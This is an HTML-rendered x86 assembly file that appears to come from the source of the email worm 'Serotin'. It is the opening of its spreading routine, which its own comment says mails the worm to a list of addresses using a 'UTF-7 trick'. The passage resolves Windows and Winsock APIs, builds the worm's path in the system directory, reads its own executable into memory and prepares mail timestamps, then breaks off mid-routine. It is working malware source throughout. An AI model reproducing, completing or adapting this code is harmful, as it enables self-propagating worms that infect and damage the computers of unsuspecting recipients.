<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Serotin - sw.inc.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Descr: This gen spreads the worm to given email addresses using UTF-7 trick</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Type:  GEN_SPREADWORM</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;INPUT:</span><span class="sc0">
</span><span class="sc1">;(EBX)  DWORD   address of an array of email addresses</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;OUTPUT:</span><span class="sc0">
</span><span class="sc1">;(EAX)  DWORD   number of sent email messages</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">spread_worm</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">sw_seh</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_delta</span><span class="sc0">
</span><span class="sc5">sw_delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;EBP = delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_count</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'KERNEL32'</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;get address of KERNEL32.DLL</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'FreeLibrary'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;and of its APIz...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_FreeLibrary</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'VirtualAlloc'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_VirtualAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'VirtualFree'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_VirtualFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'GetFileSize'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_GetFileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_CreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_ReadFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'GetDateFormatA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_GetDateFormatA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'GetTimeFormatA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_GetTimeFormatA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ---- " "----</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'WSOCK32'</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get address of WSOCK32.DLL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_seh</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_wsock32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'WSACleanup'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;and of its APIz...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_WSACleanup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'socket'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'closesocket'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_closesocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'gethostbyname'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_gethostbyname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'connect'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'recv'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'send'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'WSAStartup'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_wsadata</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">398</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@sw_wsadata</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;initialize WSOCK32</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_ok_wsa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;quit if error</span><span class="sc0">

</span><span class="sc5">sw_ok_wsa</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc4">-</span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_path</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sw_path</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;call GetSystemDirectoryA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">'niw\'          ;construct %sysdir%\win32ser.exe
</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'es23'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'xe.r'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;edi = path\filename of worm on the disk</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_CreateFileA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_endwsock</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_fHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_GetFileSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get its size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_VirtualAlloc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;allocate memory for file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_file_mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;address in ESI</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_date</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">17</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'ddd, dd MMM yyyy '</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_GetDateFormatA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get formatted date</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'HH:mm:ss '</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_GetTimeFormatA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;and time</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_read</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@sw_read</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_fHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_ReadFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;read file to memory</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_fHandle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
